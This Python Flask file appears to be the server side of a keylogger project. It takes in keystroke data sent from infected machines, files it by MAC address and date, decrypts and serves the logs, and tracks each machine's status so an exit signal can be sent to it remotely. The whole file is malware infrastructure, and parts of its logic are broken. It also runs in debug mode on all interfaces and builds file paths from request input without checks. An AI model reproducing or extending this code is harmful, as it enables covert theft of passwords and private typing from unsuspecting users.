import os

from flask import Flask, render_template, Blueprint, jsonify, request
import requests
import json
import time
from flask_cors import CORS
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt



with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
    json.dump({'flask':True}, f)


app = Flask(__name__)
CORS(app)


approved_login = {}


@app.route('/login', methods=['POST'])
def login():
    login_dic = dict(request.json)
    username = login_dic['user']
    password = login_dic['password']
    try:
        if approved_login[username] == password:
            return render_template()
    except:
        return jsonify({'status':'access denied'}), 400


@app.route('/get_by_mac', methods=['GET'])
def get_by_mac():
    mac_address = request.args['mac']
    print(mac_address)
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_mac = json.loads(f.read())
            for mac in dic_mac:
                if mac == mac_address:
                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
                    return jsonify(files), 200
        return jsonify({'status':'mac not available'}), 400
    except:
        return jsonify({'status':'mac not available'}), 400


@app.route('/get_by_mac/get_by_date', methods=['GET'])
def get_by_date():
    date = request.args['date']
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            for mac in f:
                if mac == date:
                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
                    return files, 200
        return jsonify({'status': 'mac not available'}), 400
    except:
        return jsonify({'status':'mac not available'}), 400


@app.route('/', methods=['GET'])
def hello():
    mac_address = request.args['mac']
    date_input = request.args['date']
    with open(fr"C:\Users\User\Desktop\{mac_address.replace(':','-')}.json", 'rb') as f:
        try:
            key=Decrypt.get_key(mac_address)
            dic = dict(Decrypt.decrypt_data(f.read(), key))[mac_address][date_input]
            return str(dic)
        except Exception as e:
            return jsonify({'invalid mac address': e})


@app.route('/add_data', methods=['POST'])
def add_data():
    dict_data = dict(request.json)
    data = dict_data['data'].encode()
    mac = dict_data['mac']
    try:
        os.mkdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
    except FileExistsError:
        try:
            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'ab') as f:
                f.write(data)
                return jsonify({'post':'successful'}), 200
        except Exception as e:
            print(e)
    return jsonify({'post':'not successful'}), 400


@app.route('/send_mac', methods=['POST'])
def send_mac():
    mac = request.data
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dict_f = json.loads(f.read())
            dict_f[mac.decode()] = True
            with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
                json.dump(dict_f, file)
        return jsonify({'post':'successful'}), 200
    except Exception as e:
        print(e)


@app.route('/check_status', methods=['GET'])
def check_status():
    mac = request.args.get('mac')
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_status = json.loads(f.read())
            if dic_status[mac] == False:
                return jsonify({'exit':True}), 400
        return jsonify({'exit':False}), 200
    except Exception as e:
        # print(e)
        pass
    return jsonify({'exit': False}), 200




app.run(debug=True, host='0.0.0.0')